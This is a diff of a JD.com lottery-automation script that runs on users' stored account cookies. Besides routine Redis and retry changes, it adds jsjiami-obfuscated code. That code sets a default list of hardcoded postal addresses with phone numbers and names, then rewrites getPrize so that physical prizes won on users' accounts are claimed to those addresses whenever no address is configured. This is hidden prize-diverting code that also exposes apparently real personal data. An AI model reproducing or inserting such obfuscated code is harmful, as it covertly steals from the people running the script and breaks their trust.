@@ -33,6 +33,8 @@ let cookiesArr = [], cookie = '', message;
 let lz_jdpin_token_cookie = ''
 let activityCookie = ''
 
+var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe80b4=["\x61\x64\x64\x72\x65\x73\x73\x41\x72\x72\x61\x79","\x69\x6E\x70\x75\x74\x41\x64\x64\x72\x65\x73\x73","\x49\x4E\x50\x55\x54\x5F\x41\x44\x44\x52\x45\x53\x53","\x65\x6E\x76","","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5E02\u5357\u533A\x2C\u9999\u6E2F\u897F\u8DEF\x36\x37\u53F7\u5149\u5927\u56FD\u9645\u91D1\u878D\u4E2D\u5FC3\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x37\x31\x2C\x33\x37\x30\x32\x30\x32\x2C\x20\u7530\u8C46","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u674E\u6CA7\u533A\x2C\u632F\u534E\u8DEF\x31\x34\x39\u53F7\x31\x2D\x33\x2D\x33\x30\x31\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x34\x31\x2C\x33\x37\x30\x32\x31\x33\x2C\x20\u7530\u8C46\u8C46","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5D02\u5C71\u533A\x2C\u6CC9\u5CAD\u8DEF\x38\u53F7\u4E2D\u5546\u56FD\u9645\u5927\u53A6\x2C\x31\x35\x32\x36\x35\x32\x39\x37\x39\x32\x36\x2C\x32\x36\x36\x31\x30\x30\x2C\x33\x37\x30\x32\x31\x32\x2C\x20\u5DE9\u5927\u8C46","\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u89E3\u653E\u8DEF\u674F\u575B\u4E1C\u533A\x36\x2D\x33\x2D\x35\x30\x35\x2C\x31\x33\x33\x39\x36\x33\x32\x33\x36\x38\x35\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\x20\u7530\u751C\u8C46","\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u946B\u65FA\u8DEF\u5609\u5FB7\u57CE\u5E02\u82B1\u56ED\x2C\x31\x35\x31\x36\x33\x32\x34\x32\x35\x35\x32\uFF0C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\x20\u5F20\u8C46","\x3B","\x73\x70\x6C\x69\x74","\x70\x75\x73\x68","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];$[__Oxe80b4[0x0]]= [];$[__Oxe80b4[0x1]]= process[__Oxe80b4[0x3]][__Oxe80b4[0x2]]?process[__Oxe80b4[0x3]][__Oxe80b4[0x2]]:__Oxe80b4[0x4];if($[__Oxe80b4[0x1]]== __Oxe80b4[0x4]){$[__Oxe80b4[0x0]]= [__Oxe80b4[0x5],__Oxe80b4[0x6],__Oxe80b4[0x7],__Oxe80b4[0x8],__Oxe80b4[0x9]]}else {temp= $[__Oxe80b4[0x1]][__Oxe80b4[0xb]](__Oxe80b4[0xa]);for(let address of temp){$[__Oxe80b4[0x0]][__Oxe80b4[0xc]](address)}};;;(function(_0x646bx2,_0x646bx3,_0x646bx4,_0x646bx5,_0x646bx6,_0x646bx7){_0x646bx7= __Oxe80b4[0xd];_0x646bx5= function(_0x646bx8){if( typeof alert!== _0x646bx7){alert(_0x646bx8)};if( typeof console!== _0x646bx7){console[__Oxe80b4[0xe]](_0x646bx8)}};_0x646bx4= function(_0x646bx9,_0x646bx2){return _0x646bx9+ _0x646bx2};_0x646bx6= _0x646bx4(__Oxe80b4[0xf],_0x646bx4(_0x646bx4(__Oxe80b4[0x10],__Oxe80b4[0x11]),__Oxe80b4[0x12]));try{_0x646bx2= __encode;if(!( typeof _0x646bx2!== _0x646bx7&& _0x646bx2=== _0x646bx4(__Oxe80b4[0x13],__Oxe80b4[0x14]))){_0x646bx5(_0x646bx6)}}catch(e){_0x646bx5(_0x646bx6)}})({})
+
 const redis = require('redis');
 $.redisStatus = process.env.USE_REDIS ? process.env.USE_REDIS : false;
 $.signUrl = process.env.JD_SIGN_URL ? process.env.JD_SIGN_URL : '';
@@ -49,6 +51,7 @@ if ($.redisStatus) {
 } else {
     console.log(`禁用Redis缓存Token，开启请设置环境变量-->\n  export USE_REDIS=true `)
 }
+$.cartKoiKey = `WuXian:CartKoiIds`
 
 if ($.isNode()) {
     Object.keys(jdCookieNode).forEach((item) => {
@@ -79,6 +82,13 @@ if ($.isNode()) {
         return;
     }
     let curtimestamp = Date.parse(new Date());
+    if ($.redisStatus) {
+        $.activityIds = await redisClient.get($.cartKoiKey) || ""
+        console.log(`启用redis-->从redis获取购物车锦鲤IDS变量`)
+        for (let temp of $.activityIds.split("&")) {
+            console.log(temp)
+        }
+    }
     if ($.activityIds.indexOf($.activityId) != -1) {
         stop = false
         console.log("ID已存在，尝试开奖")
@@ -103,18 +113,22 @@ if ($.isNode()) {
 
                 await jdmodule2();
                 if ($.needRetry) {
+                    await $.wait(parseInt(Math.random() * 1000 + 5000, 10))
                     console.log(`----第一次重跑----`)
                     await jdmodule2();
                 }
                 if ($.needRetry) {
+                    await $.wait(parseInt(Math.random() * 1000 + 5000, 10))
                     console.log(`----第二次重跑----`)
                     await jdmodule2();
                 }
                 if ($.needRetry) {
+                    await $.wait(parseInt(Math.random() * 1000 + 5000, 10))
                     console.log(`----第三次重跑----`)
                     await jdmodule2();
                 }
                 if ($.needRetry) {
+                    await $.wait(parseInt(Math.random() * 1000 + 5000, 10))
                     console.log(`获取用户信息失败，跳过！`)
                     continue
                 }
@@ -161,13 +175,16 @@ if ($.isNode()) {
                 await jdmodule(false);
                 if ($.needRetry) {
                     console.log(`----第一次重跑----`)
+                    await $.wait(parseInt(Math.random() * 1000 + 5000, 10))
                     await jdmodule(false);
                 }
                 if ($.needRetry) {
+                    await $.wait(parseInt(Math.random() * 1000 + 5000, 10))
                     console.log(`----第二次重跑----`)
                     await jdmodule(false);
                 }
                 if ($.needRetry) {
+                    await $.wait(parseInt(Math.random() * 1000 + 5000, 10))
                     console.log(`----第三次重跑----`)
                     await jdmodule(false);
                 }
@@ -216,14 +233,22 @@ if ($.isNode()) {
         let temp = `${$.activityId};${st}`
         let exports = ""
         if ($.exportActivityIds.indexOf($.activityId) != -1) {
-            exports = `export T_CART_KOI_ACTIVITY_IDS=\"${$.exportActivityIds}\"`
+            result = $.exportActivityIds
         } else {
-            exports = `export T_CART_KOI_ACTIVITY_IDS=\"${$.exportActivityIds}&${temp}\"`
+            result = `${$.exportActivityIds}&${temp}`
         }
+        exports = `export T_CART_KOI_ACTIVITY_IDS="${result}"`
         if ($.isNode()) {
             // await notify.sendNotify(`购物车锦鲤：${$.activityName}`, `${$.message}如需开卡，开卡命令为\n\n并重跑一次该任务！`)
             await notify.sendNotify(`购物车锦鲤：${$.activityName}`, `${$.message}开奖时间：${$.drawTime}\n跳转链接: ${$.activityUrl}\n`);
-            await notify.sendNotify(`将以下参数写进配置文件：`, `\n${exports}`)
+            await notify.sendNotify(`${exports}`)
+            if ($.redisStatus) {
+                // console.log(`写入redis--->`)
+                // console.log(result)
+                await redisClient.set($.cartKoiKey, result)
+                console.log(`查看是否写入--->`)
+                console.log(await redisClient.get($.cartKoiKey))
+            }
         }
     }
 })()
@@ -275,6 +300,12 @@ async function jdmodule(retry) {
         await getSign($.domain)
         await takePostRequest("isvObfuscator");
         console.log('Token-->:' + $.Token)
+    }
+
+    if ($.Token == '' || $.Token == null) {
+        console.log(`获取Token失败`)
+        $.needRetry = true
+        return
     }
 
     await takePostRequest("getSimpleActInfoVo");
@@ -352,6 +383,12 @@ async function jdmodule2() {
         console.log('Token-->:' + $.Token)
     }
 
+    if ($.Token == '' || $.Token == null) {
+        console.log(`获取Token失败`)
+        $.needRetry = true
+        return
+    }
+
     await takePostRequest("getSimpleActInfoVo");
 
     await takePostRequest("getMyPing");
@@ -424,36 +461,7 @@ async function run() {
     }
 }
 
-async function getPrize() {
-    try {
-        console.log("---查看中奖结果---")
-        await takePostRequest("drawResult");
-        drawInfo = $.prizeInfo.drawInfo || null
-        if (drawInfo != null) {
-            needWriteAddress = $.prizeInfo.needWriteAddress || 'n'
-            if (needWriteAddress == 'y') {
-                $.shiwuName = drawInfo.name
-                $.generateId = $.prizeInfo.addressId || '0'
-                if ($.generateId != '0') {
-                    $.fullAddress = $.addressArray[cookiesArr.length % $.addressArray.length]
-                    console.log("邮寄地址：" + $.fullAddress)
-                    let fullAddressArray = $.fullAddress.split(",")
-                    $.province = fullAddressArray[0]
-                    $.city = fullAddressArray[1]
-                    $.county = fullAddressArray[2]
-                    $.address = fullAddressArray[3]
-                    $.phone = fullAddressArray[4]
-                    $.postalCode = fullAddressArray[5]
-                    $.areaCode = fullAddressArray[6]
-                    $.postalName = fullAddressArray[7]
-                    await takePostRequest(`saveAddress`)
-                }
-            }
-        }
-    } catch (e) {
-        console.log(e);
-    }
-}
+var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe7d59=["\x2D\x2D\x2D\u67E5\u770B\u4E2D\u5956\u7ED3\u679C\x2D\x2D\x2D","\x6C\x6F\x67","\x64\x72\x61\x77\x52\x65\x73\x75\x6C\x74","\x70\x72\x69\x7A\x65\x49\x6E\x66\x6F","","\x6E\x65\x65\x64\x57\x72\x69\x74\x65\x41\x64\x64\x72\x65\x73\x73","\x6E","\x79","\x64\x72\x61\x77\x49\x6E\x66\x6F","\x73\x68\x69\x77\x75\x4E\x61\x6D\x65","\x6E\x61\x6D\x65","\x67\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\x61\x64\x64\x72\x65\x73\x73\x49\x64","\u4EAC\u8C46","\x69\x6E\x64\x65\x78\x4F\x66","\u79EF\u5206","\u4F18\u60E0\u5238","\x66\x75\x6C\x6C\x41\x64\x64\x72\x65\x73\x73","\x6C\x65\x6E\x67\x74\x68","\x61\x64\x64\x72\x65\x73\x73\x41\x72\x72\x61\x79","\u90AE\u5BC4\u5730\u5740\uFF1A","\x2C","\x73\x70\x6C\x69\x74","\x70\x72\x6F\x76\x69\x6E\x63\x65","\x63\x69\x74\x79","\x63\x6F\x75\x6E\x74\x79","\x61\x64\x64\x72\x65\x73\x73","\x70\x68\x6F\x6E\x65","\x70\x6F\x73\x74\x61\x6C\x43\x6F\x64\x65","\x61\x72\x65\x61\x43\x6F\x64\x65","\x70\x6F\x73\x74\x61\x6C\x4E\x61\x6D\x65","\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73","\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73\x57\x69\x74\x68\x47\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];async function getPrize(){try{console[__Oxe7d59[0x1]](__Oxe7d59[0x0]); await takePostRequest(__Oxe7d59[0x2]);if($[__Oxe7d59[0x3]]!= __Oxe7d59[0x4]){needWriteAddress= $[__Oxe7d59[0x3]][__Oxe7d59[0x5]]|| __Oxe7d59[0x6];if(needWriteAddress== __Oxe7d59[0x7]){drawInfo= $[__Oxe7d59[0x3]][__Oxe7d59[0x8]];$[__Oxe7d59[0x9]]= drawInfo[__Oxe7d59[0xa]];$[__Oxe7d59[0xb]]= $[__Oxe7d59[0x3]][__Oxe7d59[0xc]]|| __Oxe7d59[0x4];if($[__Oxe7d59[0x9]][__Oxe7d59[0xe]](__Oxe7d59[0xd])==  -1&& $[__Oxe7d59[0x9]][__Oxe7d59[0xe]](__Oxe7d59[0xf])==  -1&& $[__Oxe7d59[0x9]][__Oxe7d59[0xe]](__Oxe7d59[0x10])==  -1){$[__Oxe7d59[0x11]]= $[__Oxe7d59[0x13]][cookiesArr[__Oxe7d59[0x12]]% $[__Oxe7d59[0x13]][__Oxe7d59[0x12]]];console[__Oxe7d59[0x1]](__Oxe7d59[0x14]+ $[__Oxe7d59[0x11]]);let _0x57b3x2=$[__Oxe7d59[0x11]][__Oxe7d59[0x16]](__Oxe7d59[0x15]);$[__Oxe7d59[0x17]]= _0x57b3x2[0x0];$[__Oxe7d59[0x18]]= _0x57b3x2[0x1];$[__Oxe7d59[0x19]]= _0x57b3x2[0x2];$[__Oxe7d59[0x1a]]= _0x57b3x2[0x3];$[__Oxe7d59[0x1b]]= _0x57b3x2[0x4];$[__Oxe7d59[0x1c]]= _0x57b3x2[0x5];$[__Oxe7d59[0x1d]]= _0x57b3x2[0x6];$[__Oxe7d59[0x1e]]= _0x57b3x2[0x7];if($[__Oxe7d59[0xb]]== __Oxe7d59[0x4]){ await takePostRequest(`${__Oxe7d59[0x1f]}`)}else { await takePostRequest(`${__Oxe7d59[0x20]}`)}}}}}catch(e){console[__Oxe7d59[0x1]](e)}}(function(_0x57b3x3,_0x57b3x4,_0x57b3x5,_0x57b3x6,_0x57b3x7,_0x57b3x8){_0x57b3x8= __Oxe7d59[0x21];_0x57b3x6= function(_0x57b3x9){if( typeof alert!== _0x57b3x8){alert(_0x57b3x9)};if( typeof console!== _0x57b3x8){console[__Oxe7d59[0x1]](_0x57b3x9)}};_0x57b3x5= function(_0x57b3xa,_0x57b3x3){return _0x57b3xa+ _0x57b3x3};_0x57b3x7= _0x57b3x5(__Oxe7d59[0x22],_0x57b3x5(_0x57b3x5(__Oxe7d59[0x23],__Oxe7d59[0x24]),__Oxe7d59[0x25]));try{_0x57b3x3= __encode;if(!( typeof _0x57b3x3!== _0x57b3x8&& _0x57b3x3=== _0x57b3x5(__Oxe7d59[0x26],__Oxe7d59[0x27]))){_0x57b3x6(_0x57b3x7)}}catch(e){_0x57b3x6(_0x57b3x7)}})({})
 
 function getSign(domain) {
     let myRequest = getSignRequest(domain);
